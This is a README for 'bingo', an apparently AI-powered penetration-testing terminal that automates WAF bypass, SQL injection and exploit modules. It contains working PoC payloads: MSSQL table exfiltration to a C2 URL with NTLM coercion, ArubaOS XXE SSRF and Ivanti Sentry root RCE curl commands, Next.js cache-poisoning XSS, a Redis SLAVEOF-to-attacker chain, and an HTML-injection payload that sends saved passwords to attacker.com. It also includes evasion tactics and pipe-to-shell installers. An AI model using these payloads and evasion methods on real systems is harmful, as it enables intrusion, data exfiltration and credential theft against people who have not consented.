<div align="center">

<img src="assets/logo.png" width="180" alt="bingo logo"/>

# bingo

**AI-Powered Red Team Terminal**

[![Version](https://img.shields.io/badge/version-2.1.0-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
[![Status](https://img.shields.io/badge/status-Official%20Release-brightgreen)](https://github.com/bingook/bingo)

*DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*

> **v2.1.0 — Official Release**  
> Previous versions (≤ 2.0.x) were test/beta releases. v2.1.0 is the first stable, production-ready version.

</div>

---

## What is bingo?

bingo is a hacker-style AI terminal that automates real penetration testing workflows. You type a target URL, and bingo runs a full red team pipeline — WAF detection, vulnerability scanning, SQL injection, file upload exploitation, IDOR enumeration, hash cracking, and auto-generated reports — all powered by the AI model of your choice.

**Zero-Hallucination System** (new in v2.1): Every finding is labeled with an evidence level (`VERIFIED` / `LIKELY` / `INFERRED`). Nothing is discarded — unverified results are flagged separately rather than silently dropped.

---

## Installation

### Option A — pip (Recommended, all platforms)

The easiest way. Works on macOS, Windows, and Linux.

```bash
pip install bingo-ai
```

Then run:

```bash
bingo
```

To update later:

```bash
bingo --update
# or
pip install --upgrade bingo-ai
```

---

### Option B — git clone (macOS / Linux)

```bash
curl -fsSL https://raw.githubusercontent.com/bingook/bingo/main/install.sh | bash
```

Or clone manually:

```bash
git clone https://github.com/bingook/bingo.git
cd bingo
bash install.sh
```

To update later:

```bash
bingo --update
# or
cd bingo && git pull origin main
```

---

### Windows

> ⚠️ **Run in PowerShell** (not CMD).  
> Start → search `PowerShell` → **Right-click → Run as Administrator**

**Option 1 — Auto-install (recommended):**
```powershell
irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
```

**Option 2 — If execution policy error:**
```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
```

**Option 3 — Manual install (most reliable):**
```powershell
git clone https://github.com/bingook/bingo.git $env:USERPROFILE\bingo
cd $env:USERPROFILE\bingo
python -m pip install -e .
python -m bingo
```

**Option 4 — Without git:**
```powershell
Invoke-WebRequest "https://github.com/bingook/bingo/archive/main.zip" -OutFile "$env:TEMP\bingo.zip" -UseBasicParsing
Expand-Archive "$env:TEMP\bingo.zip" "$env:USERPROFILE" -Force
Rename-Item "$env:USERPROFILE\bingo-main" "$env:USERPROFILE\bingo"
cd "$env:USERPROFILE\bingo"
python -m pip install -e .
python -m bingo
```

> **Requirements:** Python 3.10+, PowerShell 5.1+

---

## Quick Start

```bash
bingo                      # Launch interactive terminal
bingo scan https://target.com  # Full automated red team scan
bingo --version            # Show version
bingo --reset              # Reset configuration
```

On first launch: **select language → enter AI model API key → start hacking**.

---

## Core Features

### Zero-Hallucination System (v2.1)

Every finding produced by bingo is assigned an evidence level:

| Level | Meaning | Report placement |
|-------|---------|-----------------|
| `✅ VERIFIED` | HTTP response confirmed (status code + URL + curl) | Main vulnerability list |
| `🟡 LIKELY` | Partial evidence (response pattern + URL) | Main list with annotation |
| `🔍 INFERRED` | No direct proof — reasoning-based | "Needs Investigation" section |
| `🤖 AI_ANALYSIS` | AI analysis text | Separate AI section |

**No finding is ever discarded.** Unverified results are clearly labeled and placed in a dedicated section so you can manually verify them — not silently dropped.

---

### Automated WAF Detection & Bypass

When a target URL is mentioned in chat, bingo automatically:
1. Detects WAF type from HTTP headers and response patterns
2. Identifies the WAF vendor (Cloudflare, AWS WAF, ModSecurity, Nginx/OpenResty, etc.)
3. **AI selects the optimal bypass technique automatically** based on WAF type
4. Executes all steps as real Python scripts — no external tool required

| WAF | Detection Method |
|-----|-----------------|
| Cloudflare | `cf-ray` header, block page signature |
| AWS WAF | `x-amzn-requestid` header, 403 pattern |
| ModSecurity | Server header, error page content |
| Nginx/OpenResty | 406 Not Acceptable, server banner |
| Sucuri / Akamai / F5 BIG-IP | Body pattern + status code |
| Chinese WAF (Safe3 / D盾 / 云锁) | Body keyword matching |

#### Advanced WAF Bypass Techniques (v2.1.9+)

bingo now includes a **6-layer advanced bypass engine** that AI activates automatically when basic techniques fail:

| Layer | Technique | When Used |
|-------|-----------|-----------|
| **SQL Function Replacement** | `IF(a,b,c)` → `CASE WHEN a THEN b ELSE c END` | WAF blocks `IF` keyword |
| **Timing via Heavy Subquery** | `SLEEP(n)` → `information_schema` cross-join | WAF blocks `SLEEP` / `BENCHMARK` |
| **GREATEST/LEAST** | Replace `=` comparison with `GREATEST(a,b)=b` | WAF detects equality operators |
| **Logical Operator Alt** | `AND` → `&&`, `OR` → `\|\|` | WAF blocks literal `AND`/`OR` |
| **Unicode / Overlong UTF-8** | `'` → `\uff07`, `/` → `%c0%af`, NULL byte injection | Legacy / regex-based WAF |
| **HTTP Chunked Transfer** | POST body split into 3–7 byte chunks | WAF without body reassembly |

##### AI Auto-Selection Logic

bingo's AI reads the WAF type and automatically picks the right bypass order:

```
Cloudflare      → double URL encoding → unicode → ua spoofing → function replace
Nginx/OpenResty → %0a newline → /**/ comment → keyword obfuscation
ModSecurity     → space/**/ → IF→CASE WHEN → mixed case → encoding
AWS WAF         → encoding → SLEEP→subquery → XFF header → space
Chinese WAF     → null byte unicode → overlong UTF-8 → function replace
Generic         → space → keyword → header spoof → encoding → function
```

When all single techniques fail, bingo automatically tries **3-layer combinations**:
1. `function_replace + space + XFF header`
2. `unicode encoding + function_replace`
3. HTTP Chunked POST (last resort)

##### Anti-IP-Ban Strategy

bingo applies random delays (`1.0–3.5s`) between requests to avoid triggering WAF/IPS rate-limit bans. This is applied automatically during all WAF bypass attempts.

---

### Interactive Post-Report Actions (v2.1)

After every report is generated, bingo presents **3–5 numbered next steps**:

```
╭─ Report saved: targets/report_example.com.md ─╮
│ What to do next?                               │
╰────────────────────────────────────────────────╯

  #  Next Options
  ─────────────────────────────────────────────
  1  Run IDOR scan on /api/user?id= endpoints
  2  Attempt IDOR-based password reset
  3  Upload GIF polyglot webshell via /upload
  4  Deep SQLi on login form with sqlmap flags
  5  Check for exposed phpinfo() or .env files

▶ Enter number + Enter (0 = exit, other = type freely)

  > _
```

Enter a number to continue automatically — no need to think about what to do next.

---

### API Discovery & AI-Powered Fuzzing (v2.1)

Inspired by Brutecat's research ("Hacking Google with AI for $500,000"), bingo automatically discovers API documentation and fuzzes every endpoint using AI-guided parameter testing.

**Step 1 — Auto-discover API docs:**

bingo probes 30+ common paths to find machine-readable API specifications:

| Doc type | Paths probed |
|----------|-------------|
| OpenAPI / Swagger | `/swagger.json`, `/openapi.json`, `/v1/api-docs`, `/v3/api-docs`, ... |
| Google Discovery | `/$discovery/rest`, `/discovery/v1/apis` |
| GraphQL | `/graphql`, `/graphiql`, `/api/graphql` |
| WordPress | `/wp-json` |
| Spring Boot | `/actuator/mappings` |

**Step 2 — AI auto-fuzzes every endpoint:**

Once endpoints are found, bingo tests them automatically:
- **Unauthenticated access** — calls every API with no cookies or tokens; `200 OK` = confirmed bypass
- **Parameter fuzzing** — injects IDOR, SQLi, SSTI, and path traversal payloads into query parameters
- **Sensitive keyword detection** — flags responses containing `password`, `token`, `traceback`, SQL error messages, etc.
- **500 error detection** — server errors triggered by payloads indicate possible injection points

**Evidence labeling:**
```
VERIFIED  = real HTTP 200 response with sensitive data confirmed
LIKELY    = suspicious response pattern (500 error, auth keyword)
INFERRED  = structural pattern match only
```

**AI auto-trigger conditions:**
- Always runs (low cost, high discovery value)
- Escalates to fuzzing only when endpoints are actually found

---

### MSSQL 2025 AI Feature Exploitation (v2.1)

> **Research basis:** [SpecterOps — "Oops, I Weaponized the Database: Abusing AI Features in SQL Server 2025"](https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/)

SQL Server 2025 introduced native AI capabilities that create entirely new attack surfaces. bingo automatically detects these conditions and generates exploitation PoCs when all three prerequisites are met.

**AI auto-trigger conditions (all three must be confirmed):**

| Condition | How bingo checks |
|-----------|-----------------|
| Target runs SQL Server 2025 | `@@version` injection or version string in error response |
| SQL injection allows stacked queries | `WAITFOR DELAY '0:0:3'` — response delay ≥ 2.5 s = confirmed |
| DB account has elevated privileges | `IS_SRVROLEMEMBER('sysadmin')` time-based check |

If any condition is not met, the module is automatically skipped — no false positives, no impact on other DB engines (MySQL, PostgreSQL, Oracle).

**Exploitation techniques (PoC generation only — not auto-executed):**

| Technique | Attack primitive | Impact |
|-----------|-----------------|--------|
| `sp_invoke_external_rest_endpoint` | POST entire DB tables to attacker server | Full data exfiltration (up to 100 MB) |
| `CREATE EXTERNAL MODEL` (UNC path) | Load model from `\\attacker-ip\share` → NTLM coercion | Admin password hash capture |
| `AI_GENERATE_EMBEDDINGS` (UNC path) | Same UNC trick via embedding model | Covert C2 channel / NTLM relay |

**Generated PoC example:**

```sql
-- Enable REST endpoint
EXEC sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;

-- Exfiltrate users table to attacker server
DECLARE @p NVARCHAR(MAX);
SELECT @p = (SELECT * FROM dbo.users FOR JSON AUTO);
EXEC sp_invoke_external_rest_endpoint
    @url = N'https://YOUR-C2/collect',
    @method = 'POST',
    @payload = @p;

-- NTLM hash coercion via external model
CREATE EXTERNAL MODEL ntlm_bait WITH (
    LOCATION = '\\YOUR-ATTACKER-IP\share',
    API_FORMAT = 'ONNX Runtime',
    MODEL_TYPE = EMBEDDINGS,
    MODEL = 'capture'
);
```

**Evidence labeling:**
```
VERIFIED  = WAITFOR DELAY confirmed stacked query + version string confirmed
LIKELY    = MSSQL error detected but version unconfirmed
INFERRED  = MSSQL fingerprint only, stacked queries not tested
```

**Remediation (auto-included in report):**
1. `EXEC sp_configure 'external rest endpoint enabled', 0; RECONFIGURE;`
2. Block outbound connections from the SQL Server host at the firewall
3. Remove `sysadmin` privilege from the application DB account
4. Apply SQL injection patch (Parameterized Query)

---

### ArubaOS Pre-Auth XXE → OOB SSRF (v2.1)

> **Research basis:** [netacoding.com — "Pre-Authentication XXE → OOB SSRF in ArubaOS 8.x"](https://netacoding.com/posts/xxe-ssrf/)  
> **Severity:** CVSS 9.3 Critical  
> **Disclosed:** Bugcrowd submission 9e946ca3 (closed as "theoretical")

HPE Aruba ArubaOS 8.13.2.0 and earlier expose an **unauthenticated XML management API on port 32000/TCP**. The API processes XML `SYSTEM` entities without authentication, allowing a pre-auth attacker to force the controller to make arbitrary outbound HTTP requests (OOB SSRF) and scan internal network services.

**AI auto-trigger conditions:**

| Condition | How bingo checks |
|-----------|-----------------|
| Port 32000/TCP open | TCP socket connect (3 s timeout) |
| ArubaOS XML API banner | `<dialog>`, `aruba`, `ArubaOS` in HTTP response |
| Automatic on match | No user interaction required |

If port 32000 is not reachable, the module is silently skipped — zero false positives, no impact on other scan modules.

**Attack chain bingo detects:**

| Step | Technique | Evidence level |
|------|-----------|---------------|
| 1 | Port 32000 open confirmation | `VERIFIED` — TCP socket |
| 2 | ArubaOS XML API banner detection | `VERIFIED` — response content match |
| 3 | OOB SSRF callback (with OOB server) | `VERIFIED` — actual HTTP callback received |
| 4 | Timing-based blind XXE (no OOB server) | `LIKELY` — request timeout anomaly |
| 5 | Internal port scan via SSRF | `VERIFIED` — response content differs per port |

**PoC payload (auto-generated in report):**

```xml
<!-- Step 1: Basic OOB SSRF — triggers outbound connection to attacker -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "http://YOUR-SERVER:9999/xxe-probe">
]>
<aruba><opcode>&xxe;</opcode></aruba>
```

```bash
# Full automated curl PoC (generated by bingo in report)
# Step 1: Start listener
nc -lvp 9999

# Step 2: Send XXE payload
curl -s -X POST 'http://TARGET:32000/' \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://YOUR-IP:9999/probe">]><aruba><opcode>&xxe;</opcode></aruba>'

# Step 3: Internal port scan via SSRF
for port in 22 80 443 3306 5432 9200; do
  curl -s -X POST 'http://TARGET:32000/' \
    -H 'Content-Type: text/xml' \
    -d "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"http://127.0.0.1:$port/\">]><aruba><opcode>&x;</opcode></aruba>"
done
```

**Evidence labeling:**
```
VERIFIED  = OOB callback actually received by attacker server
LIKELY    = request timeout anomaly (server attempted external connection)
INFERRED  = port 32000 open + Aruba banner, but XXE not confirmed
```

**Remediation (auto-included in report):**
1. Upgrade ArubaOS to the latest version immediately
2. Block port 32000/TCP from external access at the firewall (management VLAN only)
3. Disable XML External Entity processing in the XML API parser
4. Enforce authentication on all XML API endpoints (AAA profile)
5. Restrict outbound HTTP connections from the controller to a whitelist

---

### OAuth Misconfiguration Chain Attack Detection (v2.1)

> **Research basis:**  
> [Shafayat Ahmed Alif — "Critical OAuth Misconfiguration → Account Takeover"](https://medium.com/@iamshafayat/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-abfec43eaea6)  
> [Ali Mojaver — "The Most Dangerous OAuth Bug I've Ever Found"](https://medium.com/@AliMojaver/the-most-dangerous-oauth-bug-ive-ever-found-a2af1275385c)

Two distinct OAuth attack chains auto-detected and combined into a single scanner.

#### Pattern A — Open Registration Chain (Shafayat's 5-step ATO chain)

| Step | Check | Severity |
|------|-------|----------|
| ① | `POST /oauth/register` (no auth) → HTTP 201 + `client_id` returned | High |
| ② | `POST /oauth/authorize` (no session cookie) → HTTP 200/201 + `redirect_uri` | Critical |
| ③ | Token exchange using PKCE only (no `client_secret`) | Medium |
| ④ | `OPTIONS /oauth/token` → `Access-Control-Allow-Origin: *` | Medium |
| Chain | All 4 conditions: full Authorization Code Hijacking → ATO | **Critical** |

#### Pattern B — Unverified Email OAuth Trust (Ali Mojaver's email-trust chain)

| Step | Check | Severity |
|------|-------|----------|
| ① | `POST /auth/register` with arbitrary email → immediate token returned (no verification required) | High |
| ② | Platform serves `/.well-known/oauth-authorization-server` or shows OAuth provider patterns | Medium |
| Chain | ① + ②: Register as `victim@gmail.com` → login as victim on ALL integrated sites | **Critical** |

#### AI Auto-Trigger Conditions
- `/.well-known/oauth-authorization-server` accessible (HTTP 200)
- Response contains `authorization_endpoint` / `token_endpoint` / `client_id=`
- Target URL contains `/oauth/`, `/auth/`, `/connect/`
- Homepage contains OAuth login button patterns

#### Chain Risk Score
- **Pattern A**: 0–5 points (3+ = High, 5 = Critical)
- **Pattern B**: 0–3 points (2+ = Critical — mass ATO risk)
- cURL PoC auto-generated for all confirmed findings

---

### Ivanti Sentry Pre-Auth RCE — CVE-2026-10520 (v2.1)

> **Research basis:** [watchTowr Labs — "Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520"](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)  
> **Severity:** CVSS 10.0 Critical  
> **Companion:** CVE-2026-10523 — Authentication Bypass (admin account creation)

Ivanti Sentry (formerly MobileIron Sentry) versions before R10.5.2/R10.6.2/R10.7.1 expose an **unauthenticated POST endpoint** that passes user input directly into an internal MICS configuration engine — allowing pre-auth OS command injection as **root**.

**Vulnerable endpoint:**
```
POST /mics/api/v2/sentry/mics-config/handleMessage
```

**AI auto-trigger conditions:**

| Condition | How bingo checks |
|-----------|-----------------|
| Ivanti Sentry product present | `GET /mics/login.jsp` exists (HTTP 200/302) |
| Endpoint reachable without auth | `POST /mics/.../handleMessage` → no 302 redirect |
| Patched version detection | HTTP 302 to login page = patched, skip module |

If none of the conditions match, the module is silently skipped — no impact on other scan phases.

**How the injection works:**

```
message= execute system /configuration/system/commandexec
         <commandexec>
           <index>1</index>
           <reqandres>OS_COMMAND_HERE</reqandres>
         </commandexec>
```

The `message` parameter is parsed as a MICS configuration command → routed to `EXECUTE` handler → `executeNativeCommand()` via Java reflection → **root shell execution**.

**PoC (bingo auto-generates in report):**

```bash
# Confirm RCE — no credentials required
curl -sk -X POST 'https://TARGET/mics/api/v2/sentry/mics-config/handleMessage' \
  -d 'message=execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>id</reqandres></commandexec>'

# Expected response (VERIFIED evidence):
# {"status":200,"data":"<result><success>uid=0(root) gid=0(root)\n</success></result>"}
```

**Evidence labeling:**

```
VERIFIED  = command output extracted from HTTP response (id / uname -a)
LIKELY    = endpoint accessible (no 302) but no command output confirmed
INFERRED  = /mics/login.jsp exists, endpoint not yet tested
```

**Safe probe mode (default):** bingo only executes read-only commands (`id`, `uname -a`, `hostname`) — no system modifications.

**Affected versions:**

| Version | Status |
|---------|--------|
| < R10.5.2 | **Vulnerable** |
| < R10.6.2 | **Vulnerable** |
| < R10.7.1 | **Vulnerable** |
| R10.5.2+ / R10.6.2+ / R10.7.1+ | Patched |

**Remediation (auto-included in report):**
1. Upgrade Ivanti Sentry to R10.5.2 / R10.6.2 / R10.7.1 immediately
2. Block `/mics/api/v2/sentry/mics-config/handleMessage` at the firewall
3. Restrict Sentry management interface to isolated management VLAN only
4. Apply CVE-2026-10523 patch simultaneously (admin account creation bypass)
5. Review `/mics/` access logs for abnormal POST requests (incident investigation)

---

### Next.js Cache Poisoning → 0-click SXSS (v2.1)

> **Research basis:**  
> [Rachid Allam (zhero;) & inzo\_ — "Re:CACHE - Excessive reflection, type confusion, and 0-click SXSS on Next.js"](https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs)  
> Rewarded: **five-figure bug bounty** at a globally recognized company

**Attack chain:**

```
① Request headers reflected in response headers (middleware misconfiguration)
    Request:  Content-Type: text/html
    Response: Content-Type: text/html  ← reflected as-is
    
② Next.js App Router + RSC payload context switch
    GET /dynamic-page?pwn=<xss>  +  Rsc: 1  +  Content-Type: text/html
    → RSC payload served as text/html instead of text/x-component
    → URL params reflected in RSC body after __PAGE__ marker → XSS context
    
③ Cloudflare caches poisoned response (ignores Vary: Rsc)

④ Stage 2: Home page poisoned with Refresh header
    GET /  +  Refresh: 0; /dynamic-page?pwn=<xss>
    → Victim visits homepage → auto-redirected → XSS fires
    
⑤ Zero-click: no user interaction required
```

**AI auto-trigger conditions** (bingo runs this automatically):

| Condition | Detection method |
|-----------|-----------------|
| `x-powered-by: Next.js` | HTTP response header |
| `_next/static` or `__NEXT_DATA__` in body | HTML body scan |
| `cf-cache-status` header present | Cloudflare detection |
| RSC response changes with `Rsc: 1` header | Active probe |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `nextjs_detected` | `VERIFIED` | Info |
| `cache_layer` | `VERIFIED` (cf-cache-status header) | Medium |
| `header_reflection` | `VERIFIED` (Content-Type changes) | High |
| `rsc_dynamic_page` | `VERIFIED` (HTTP 200 + x-component) | Medium |
| `content_type_injection` | `VERIFIED` (response CT = text/html) | High |
| `param_reflected_in_rsc` | `VERIFIED` (marker in body) | Critical |
| `cache_sxss_chain` | `VERIFIED`/`LIKELY` | Critical |

**Auto-generated PoC:**

```bash
# Stage 1: Poison dynamic page
curl -sk 'https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
  -H 'Rsc: 1' \
  -H 'Content-Type: text/html' -D -

# Stage 2: Poison homepage with Refresh redirect
curl -sk 'https://target.com/' \
  -H 'Refresh: 0; https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
  -D -

# Result: victim visits https://target.com/ → XSS fires automatically
```

**Vulnerable conditions (all must be true for full chain):**

1. Next.js App Router (not Pages Router)
2. Middleware forwards request headers to response headers
3. External cache layer (Cloudflare, CDN) that ignores `Vary: Rsc`
4. Dynamic pages with URL parameter → RSC body reflection

**Remediation (auto-included in report):**
1. **Remove header forwarding** in middleware — never pass request `Content-Type` to response
2. Force `Content-Type: text/x-component` for all RSC responses (non-overridable)
3. Exclude RSC paths from CDN caching (`Cache-Control: no-store`)
4. HTML-encode all URL parameters before including in RSC payload
5. Upgrade to Next.js 14.2.32+ / 15.4.7+

---

### Redis DarkReplica UAF → Post-Auth RCE (CVE-2026-23631) (v2.1)

> **Research basis:**  
> [Yoni Sherez — "DarkReplica: Redis CVE-2026-23631"](https://www.zeroday.cloud/blog/redis-cve-2026-23631-dark-replica)  
> **$30,000** at London Security Conference 2025  
> **Skill module:** `RedisDarkReplica` (id: 48)

**Vulnerability overview:**

Redis is single-threaded, but calls `processEventsWhileBlocked()` during Lua function execution timeouts. This allows the replication subsystem to process `FULLRESYNC` events from a master server **while a Lua function is still running**. The `lua_State` object gets freed mid-execution, leading to a **Use-After-Free (UAF)** condition that enables arbitrary read/write primitives and ultimately code execution.

**Attack chain:**

```
① Attacker authenticates to Redis (requires credentials OR no-auth Redis)

② Register slow Lua function (blocks for >lua-time-limit ms)
   FUNCTION LOAD "#!lua name=exploit\nredis.register_function('slow',
     function(keys,argv) while 1 do end end)"

③ Assign victim Redis as slave of attacker's fake master server
   SLAVEOF attacker_ip 8474
   CONFIG SET slave-read-only no

④ Attacker's fake master sends FULLRESYNC at exact moment Lua is running
   → processEventsWhileBlocked() frees lua_State while Lua still executing

⑤ UAF: Heap spray reallocates freed memory with attacker data
   → Arbitrary read/write → ASLR bypass → system() → RCE
```

**AI auto-trigger conditions** (bingo automatically activates when):

| Condition | Detection method |
|-----------|-----------------|
| Port 6379/6380/6381/6382 open | TCP connect probe |
| Redis PING → PONG response | Banner confirmation |
| `redis`, `jedis`, `ioredis` in target URL/body | Keyword scan |
| Redis credentials found in previous scan | Session credential store |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `redis_found` | `VERIFIED` (PING→PONG) | Info |
| `redis_noauth` | `VERIFIED` (no AUTH required) | Critical |
| `redis_weak_auth` | `VERIFIED` (AUTH '' success) | Critical |
| `redis_auth_success` | `VERIFIED` (AUTH credential success) | High |
| `vulnerable_version` | `VERIFIED` (INFO server version check) | Critical |
| `patched_version` | `VERIFIED` | Info |
| `slaveof_allowed` | `VERIFIED` (SLAVEOF NO ONE → OK) | High |
| `function_engine_available` | `VERIFIED` (FUNCTION LIST response) | High |
| `dark_replica_exploitable` | `VERIFIED` (all conditions confirmed) | Critical |
| `dark_replica_likely` | `LIKELY` (version vulnerable, partial perms) | Critical |

**Affected versions:**

| Series | Vulnerable | Fixed |
|--------|-----------|-------|
| 7.2.x | 7.2.0 – 7.2.13 | **7.2.14** |
| 7.4.x | 7.4.0 – 7.4.8 | **7.4.9** |
| 8.2.x | 8.2.0 – 8.2.5 | **8.2.6** |
| 8.4.x | 8.4.0 – 8.4.2 | **8.4.3** |
| 8.6.x | 8.6.0 – 8.6.2 | **8.6.3** |

**Auto-generated PoC (included in report):**

```bash
# Step 1: Verify vulnerable version
redis-cli -h TARGET -p 6379 INFO server | grep redis_version

# Step 2: Register slow Lua function
redis-cli -h TARGET -p 6379 FUNCTION LOAD \
  "#!lua name=exploit\nredis.register_function('slow', \
   function(keys,argv) local co=coroutine.create(function() while 1 do end end); \
   coroutine.resume(co) end)"

# Step 3: Assign victim as slave of attacker
redis-cli -h TARGET -p 6379 SLAVEOF attacker_ip 8474
redis-cli -h TARGET -p 6379 CONFIG SET slave-read-only no

# Step 4: Trigger UAF (run fake master + FCALL simultaneously)
redis-cli -h TARGET -p 6379 FCALL slow 0
# Expected: RCE via system() after heap spray
```

**Zero-Hallucination guarantee:**
- Version check performed via actual `INFO server` response → `VERIFIED`
- All permission checks (SLAVEOF, FUNCTION) are read-safe and non-destructive
- Exploitability flag only set when ALL conditions confirmed

**Remediation (auto-included in report):**
1. **Patch immediately** — upgrade to fixed version for your series
2. **Block Redis externally** — firewall port 6379 from public internet
3. **Enable authentication** — `requirepass <strong-random-password>`
4. **ACL restrictions** — limit `SLAVEOF`, `REPLICAOF`, `FUNCTION LOAD` to admin users only
5. **Reduce Lua time limit** — `lua-time-limit 500` to minimize UAF trigger window
6. **Network isolation** — bind Redis to `127.0.0.1` or internal VLAN only

---

### HTML Injection + Chrome Password Autofill → CSP Bypass Password Theft (v2.1)

> **Research basis:**  
> [Rafał Wójcicki (AFINE) — "Stealing Passwords via HTML Injection Under a Strict CSP"](https://afine.com/blogs/stealing-passwords-via-html-injection-under-a-strict-csp)  
> Published: May 26, 2026  
> **Skill module:** `HtmlAutofillSteal` (id: 49)

**Key insight:**

A strict Content-Security-Policy (`script-src 'none'`, `default-src 'none'`) **blocks XSS** but does **NOT** block:
- HTML injection (planting a fake form)
- `<meta http-equiv="Refresh">` redirects
- `<meta name="referrer" content="unsafe-url">` overrides
- Chrome password autofill filling any matching form on the domain

This enables **password exfiltration without any JavaScript**, even on maximally hardened pages.

**Attack chain:**

```
① Reflected HTML injection found in GET parameter
   GET /?html=<b>test</b>  →  <b>test</b> rendered in response

② Inject fake login form (email + password fields)
   Chrome password manager auto-fills saved credentials for the domain

③ Form submitted via GET → credentials appear in URL as query params
   /?email=victim@gmail.com&password=S3cr3tP@ss

④ Override Referrer-Policy via injected <meta> tag
   <meta name="referrer" content="unsafe-url">
   → Chrome sends full URL (including password) in Referer header

⑤ Meta-refresh redirect to attacker's server
   <meta http-equiv="Refresh" content="0,url=https://attacker.com">
   → Attacker's server receives: Referer: /?email=victim@...&password=S3cr3tP@ss

⑥ Result: saved password exfiltrated via single user click
```

**Why browsers are exploitable:**

| Browser | No policy | `no-referrer` set |
|---------|-----------|-------------------|
| Chrome | Full URL leaked for `<img>`, `<script>`, `<a>`, `<meta>` refresh | Full URL still leaked (Chrome ignores policy on `<meta>`) |
| Firefox | Only `<a>` + `<meta>` refresh leak full URL | Same as no-policy |
| Safari | Only `<a>` + `<meta>` refresh leak full URL | Same as no-policy |

**Chrome is most dangerous** — fills saved credentials regardless of `form action` domain.

**AI auto-trigger conditions** (bingo activates automatically):

| Condition | Detection method |
|-----------|-----------------|
| `login`, `signin`, `auth` in target URL | URL keyword scan |
| Login form (`type=email` + `type=password`) in HTML body | Body analysis |
| GET parameter reflects HTML (any tag rendered) | Active probe with `<b>BINGO_PROBE</b>` |
| CSP `script-src 'none'` detected | Header analysis |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `csp_detected` | `VERIFIED` (response header) | High |
| `login_form_found` | `VERIFIED` (body analysis) | Info |
| `html_injection_found` | `VERIFIED` (payload reflected in response) | High |
| `csp_bypassed_via_html` | `VERIFIED` (strict CSP + injection confirmed) | Critical |
| `referrer_policy_override` | `VERIFIED`/`LIKELY` | High |
| `autofill_steal_exploitable` | `VERIFIED` (full chain confirmed) | Critical |
| `autofill_steal_likely` | `LIKELY` | High |

**Auto-generated PoC (1-click password theft):**

```bash
# Stage 1: Visit this URL as victim (Chrome autofills saved password)
# On form submit, redirected to stage 2 with credentials in URL

http://target.com/?html=
  <form action="/">
    <input type=email name=email />
    <input type=password name=password />
    <input name=html value='/?html=
      <meta name="referrer" content="unsafe-url">
      <meta http-equiv="Refresh" content="0,url=https://attacker.com" />' />
    <input type=submit />
  </form>

# Stage 2 (attacker server receives):
# GET / HTTP/1.1
# Host: attacker.com
# Referer: http://target.com/?email=victim@gmail.com&password=S3cr3tP@ss
```

**CSS full-page variant (1-click anywhere, requires `style-src unsafe-inline`):**

```html
<input type=submit style="position:fixed;top:0;left:0;
  width:100vw;height:100vh;z-index:999999;opacity:0"/>
```
→ Invisible full-page button — victim clicks **anywhere** on the page.

**Requirements:**

1. Reflected HTML injection in any GET parameter (XSS NOT required)
2. Login form on same domain with credentials saved in browser
3. Works with any CSP, including `script-src 'none'; default-src 'none'`

**Remediation (auto-included in report):**
1. **Fix HTML injection at source** — contextually encode all reflected output (HTML Entity encoding)
2. **Force POST on login forms** — never allow `method="GET"` for password fields
3. **Explicit `Referrer-Policy: no-referrer`** — set in HTTP response headers (not just `<meta>`)
4. **Never put credentials in URLs** — GET parameters appear in server logs, proxy logs, browser history
5. **Treat HTML injection as Critical** — even without XSS, it enables credential theft

---

### Ruby Web App Fuzzing Surface Detection — Ruzzy + LibAFL C Extension Attack Surface Mapper (v2.1)

> **Research basis:**  
> Matt Schwager (Trail of Bits)  
> ["Extending Ruzzy with LibAFL"](https://blog.trailofbits.com/2026/04/29/extending-ruzzy-with-libafl/)  
> Published: April 29, 2026 | Ruzzy 0.8.0 released with LibAFL backend support  
> **Skill module:** `RubyLibAFLFuzz` (id: 54)

#### Background

Ruzzy is Trail of Bits' coverage-guided fuzzer for pure Ruby code and Ruby C extensions. Version 0.8.0 introduced support for LibAFL as an alternative to the original LLVM libFuzzer backend.

Key technical insights from the research:

| Issue | Root Cause | Solution Applied |
|-------|-----------|-----------------|
| `.preinit_array` linker error | GNU `ld` does not support `.preinit_array` sections required by LibAFL's `libFuzzer.a` | Switch from GNU `ld` to LLVM `lld` linker |
| Coverage map initialization order | libFuzzer lazily accepts maps; LibAFL requires all maps registered **before** `LLVMFuzzerRunDriver` starts | Pre-require Ruby C extensions before `Ruzzy.fuzz {}` call, not inside the lambda |
| SanitizerCoverage `.init_array` → `.preinit_array` | C extensions register coverage maps via `.init_array` but LibAFL expects `.preinit_array` | Ensured Ruzzy harness loads C extension at startup via `require` outside lambda |

#### What bingo Detects (RubyLibAFLFuzz)

bingo's `RubyLibAFLFuzz` module maps the fuzzing attack surface of Ruby-based web applications:

| Detection Target | C Extension | Fuzz Value |
|-----------------|-------------|------------|
| GraphQL endpoint | `graphql-ruby` / `libgraphqlparser` | **HIGH** — binary parser, complex grammar |
| JSON API endpoints | `oj` / `Oj C extension` | **HIGH** — native JSON parser |
